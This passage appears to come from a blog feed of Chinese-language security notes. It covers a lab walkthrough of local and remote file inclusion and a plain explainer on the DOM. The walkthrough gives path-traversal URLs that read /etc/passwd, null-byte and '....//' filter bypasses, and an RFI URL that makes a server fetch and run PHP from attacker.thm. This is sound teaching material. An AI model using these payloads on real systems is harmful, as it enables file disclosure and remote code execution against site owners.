class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;such&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;directory&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;www&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;错误消息泄露了重要信息。输入 THM 作为输入后，将显示一条错误消息，显示 include 函数的外观：&lt;code&gt;include（languages/THM.php）;&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;如果你仔细查看该目录，我们可以看出 functions includes files in the languages 目录正在添加 .php 的 API 文件。因此，有效的输入将如下所示：&lt;code&gt;index.php？lang=EN&lt;/code&gt;，其中文件 EN 位于给定的语言目录中，名为 EN。php 的&lt;/p&gt;
&lt;p&gt;此外，错误消息还泄露了有关完整 Web 应用程序目录路径的另一条重要信息，即 &lt;code&gt;/var/www/html/THM-4/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;要利用这一点，我们需要使用 &lt;code&gt;../&lt;/code&gt; 技巧，如 目录遍历 部分所述，以导出当前文件夹。让我们尝试以下作：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/index.php?lang=../../../../etc/passwd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;请注意，我们使用了 4 ../ 因为我们知道该路径有四个级别 &lt;code&gt;/var/www/html/THM-4&lt;/code&gt;。但我们仍然收到以下错误：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Warning&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;languages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/../../../../../&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;etc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;failed&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;such&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;directory&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;www&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;似乎我们可以移出 PHP 目录，但是 include 函数仍然使用 .PHP 最后！这告诉我们开发人员指定要传递给 include 函数的文件类型。要绕过这种情况，我们可以使用 NULL BYTE，即 &lt;code&gt;%00&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;使用空字节是一种注入技术，其中 URL 编码的表示形式（如 %00 或 0x00）以十六进制表示形式与用户提供的数据一起终止字符串。您可以将其视为试图欺骗 Web 应用程序忽略 Null Byte 之后的任何内容。&lt;/p&gt;
&lt;p&gt;通过在有效负载的末尾添加 Null Byte，我们告诉 include 函数忽略 null 字节之后的任何内容，这可能如下所示：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;include(&amp;#34;languages/../../../../../etc/passwd%00&amp;#34;).&amp;#34;.php&amp;#34;); `等同于 `include(&amp;#34;languages/../../../../../etc/passwd&amp;#34;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt; %00 技巧是固定的，不适用于 PHP 5.3.4 及更高版本。&lt;/p&gt;
&lt;h3 id=&#34;四&#34;&gt;四
&lt;/h3&gt;&lt;p&gt;现在在实验 #4 中应用这个技术，并弄清楚如何读取 /etc/passwd。&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=../../../../etc/passwd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/index.php?lang=../../../../etc/passwd&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我们收到了以下错误！&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Warning&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;languages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;etc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;failed&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;stream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;such&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;directory&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;www&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;如果我们检查 include（languages/etc/passwd） 部分中的警告消息，我们知道 Web 应用程序替换了 ../ 替换为空字符串。我们可以使用几种技术来绕过这种情况。&lt;/p&gt;
&lt;p&gt;首先，我们可以发送以下 payload 来绕过它： &lt;code&gt;....//....//....//....//....//etc/passwd&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这之所以有效，是因为 PHP 过滤器仅匹配并替换第一个子集字符串 &lt;code&gt;../&lt;/code&gt; 它找到并且不执行另一次传递，留下下图所示的内容。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319152704750.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;五&#34;&gt;五
&lt;/h3&gt;&lt;p&gt;最后，我们将讨论开发人员强制 include 从定义的目录中读取的情况！例如，如果 Web 应用程序要求提供必须包含目录的输入，例如： &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=languages/EN.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/index的php?lang=languages/EN.php&lt;/a&gt;然后，要利用这一点，我们需要将目录包含在有效负载中，如下所示： &lt;code&gt;?lang=languages/../../../../../etc/passwd&lt;/code&gt; 。&lt;/p&gt;
&lt;h2 id=&#34;远程文件包含-rfi&#34;&gt;远程文件包含 RFI
&lt;/h2&gt;&lt;p&gt;远程文件包含 （RFI） 是一种将远程文件包含到易受攻击的应用程序中的技术。与 LFI 一样，RFI 发生在对用户输入进行不当审查时，从而允许攻击者将外部 URL 注入 include 函数。RFI 的一个要求是需要打开 allow_url_fopen 选项。&lt;/p&gt;
&lt;p&gt;RFI 的风险高于 LFI，因为 RFI 漏洞允许攻击者在服务器上获得远程命令执行 （RCE）。RFI 攻击成功的其他后果包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;敏感信息泄露&lt;/li&gt;
&lt;li&gt;跨站点脚本 （XSS）&lt;/li&gt;
&lt;li&gt;拒绝服务 （DoS）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;外部服务器必须与应用程序服务器通信，才能成功进行 RFI 攻击，攻击者在其服务器上托管恶意文件。然后，恶意文件通过 HTTP 请求注入 include 函数，恶意文件的内容在易受攻击的应用程序服务器上执行。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250319152859979.png&#34;
	
	
	
	loading=&#34;lazy&#34;
	
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;rfi步骤&#34;&gt;RFI步骤
&lt;/h3&gt;&lt;p&gt;下图是成功进行 RFI 攻击的步骤示例！假设攻击者在他们自己的服务器 http：//attacker 上托管了一个 PHP 文件。thm/cmd.txt，其中 cmd.txt 包含打印消息 Hello THM.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?PHP echo &amp;#34;Hello THM&amp;#34;; ?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;首先，攻击者注入恶意 URL，该 URL 指向攻击者的服务器，例如 &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt&lt;/a&gt;的攻击者。THM/cmd.txt。如果没有输入验证，则恶意 URL 将传递到 include 函数中。接下来，Web 应用程序服务器将向恶意服务器发送 GET 请求以获取文件。因此，Web 应用程序将远程文件包含在 include 函数中，以执行页面内的 PHP 文件并将执行内容发送给攻击者。在我们的示例中，当前页面在某处必须显示 Hello THM 消息。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>DOM 文档对象模型</title>
        <link>https://Yerucrem.github.io/p/dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/</link>
        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B/</guid>
        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/f4a6e2d065c3c9fcd40dfb76bc3317b0d466b12c787faa354faa62457ded2ba5.png" alt="Featured image of post DOM 文档对象模型" /&gt;&lt;h1 id=&#34;dom&#34;&gt;DOM
&lt;/h1&gt;&lt;p&gt;Document Object Model 文档对象模型&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.w3.org/TR/REC-DOM-Level-1/introduction.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;什么是文档对象模型？ &amp;mdash; What is the Document Object Model?&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;dom-是什么&#34;&gt;DOM 是什么？
&lt;/h2&gt;&lt;p&gt;想象一下，你有一张房子的&lt;strong&gt;建筑蓝图&lt;/strong&gt;，上面画着房子的每一个部分：墙、门、窗户、屋顶等等。DOM 就像是网页的“蓝图”。当你打开一个网页，浏览器会把网页的 HTML 代码（那些 &lt;code&gt;&amp;lt;html&amp;gt;、&amp;lt;div&amp;gt;、&amp;lt;p&amp;gt;&lt;/code&gt; 标签）解析成一个树状结构，这个结构就是 DOM。它把网页里的每一个元素（比如标题、段落、图片）都整理得清清楚楚，让计算机（特别是 JavaScript）能找到它们、操作它们。&lt;/p&gt;
&lt;p&gt;简单来说，DOM 是网页的&lt;strong&gt;骨架图&lt;/strong&gt;，它把网页的内容变成一个个“节点”（node），这些节点就像蓝图上的标记点，互相之间还有父子关系、兄弟关系，形成一个大树。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;title&amp;gt;我的网页&amp;lt;/title&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/head&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;h1&amp;gt;欢迎&amp;lt;/h1&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &amp;lt;p&amp;gt;这是一个段落。&amp;lt;/p&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &amp;lt;/body&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;/html&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;在这个 HTML 里，DOM 会把它变成一个树形结构：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- &amp;lt;html&amp;gt; 是根节点，就像树的树根，整个网页的起点。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- &amp;lt;html&amp;gt; 下面有两个“孩子”：&amp;lt;head&amp;gt; 和 &amp;lt;body&amp;gt;。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- &amp;lt;head&amp;gt; 里有个孩子 &amp;lt;title&amp;gt;，它的内容是“我的网页”。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- &amp;lt;body&amp;gt; 里有两个孩子：&amp;lt;h1&amp;gt;（内容是“欢迎”）和 &amp;lt;p&amp;gt;（内容是“这是一个段落。”）。
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;这就像一个家庭的家谱：&amp;lt;html&amp;gt; 是爷爷，&amp;lt;head&amp;gt; 和 &amp;lt;body&amp;gt; 是他的两个孩子，&amp;lt;title&amp;gt; 是 &amp;lt;head&amp;gt; 的孩子，&amp;lt;h1&amp;gt; 和 &amp;lt;p&amp;gt; 是 &amp;lt;body&amp;gt; 的孩子。每个节点都是一个“对象”，有自己的属性，比如 &amp;lt;p&amp;gt; 的 innerHTML 属性就是“这是一个段落。”。
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;dom-有什么用&#34;&gt;DOM 有什么用？
&lt;/h2&gt;&lt;p&gt;DOM 的牛逼之处在于，它让 &lt;strong&gt;JavaScript&lt;/strong&gt; 能和网页互动。有了 DOM，JavaScript 就像一个装修工人，可以拿着网页的蓝图（DOM）去干活：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;查看&lt;/strong&gt;：找到某个节点，看看它是什么内容。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;修改&lt;/strong&gt;：比如把 &lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt; 的文字从“这是一个段落。”改成“这是新段落！”。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;添加&lt;/strong&gt;：在 &lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt; 里加一个新的 &lt;code&gt;&amp;lt;p&amp;gt;&lt;/code&gt; 节点。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;删除&lt;/strong&gt;：把某个节点去掉。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;举个例子：你想做一个网页，用户点一个按钮，页面上的文字就变了。你可以用 JavaScript 写代码，通过 DOM 找到那个文字所在的节点，然后改它的内容。比如：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;找到 &amp;lt;p&amp;gt; 节点 let paragraph = document.querySelector(&amp;#34;p&amp;#34;); // 修改它的内容 paragraph.innerHTML = &amp;#34;文字被我改啦！&amp;#34;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;再比如，你想做一个待办事项列表，用户点按钮就能添加新任务。这也是通过 DOM 实现的：JavaScript 创建一个新节点（比如 &lt;code&gt;&amp;lt;li&amp;gt;&lt;/code&gt;），然后把它加到列表里。&lt;/p&gt;
&lt;h2 id=&#34;dom-是桥梁&#34;&gt;DOM 是桥梁
&lt;/h2&gt;&lt;p&gt;所以，DOM 就像是网页（HTML）和 JavaScript 之间的“翻译官”或者“桥梁”。HTML 负责写出网页的内容和结构，DOM 把这些内容变成一个树形结构，JavaScript 通过 DOM 来动态地控制网页，让网页不再是静态的，而是可以互动、有变化的。&lt;/p&gt;
&lt;h2 id=&#34;小结&#34;&gt;小结
&lt;/h2&gt;&lt;p&gt;用最简单的话说：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;DOM 是网页的树形蓝图&lt;/strong&gt;，把每个元素都变成节点。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;JavaScript 通过 DOM 操作网页&lt;/strong&gt;，可以改内容、加东西、删东西。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;它让网页变得活起来&lt;/strong&gt;，能根据用户的操作动态变化。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>SQL注入基础</title>
        <link>https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</guid>
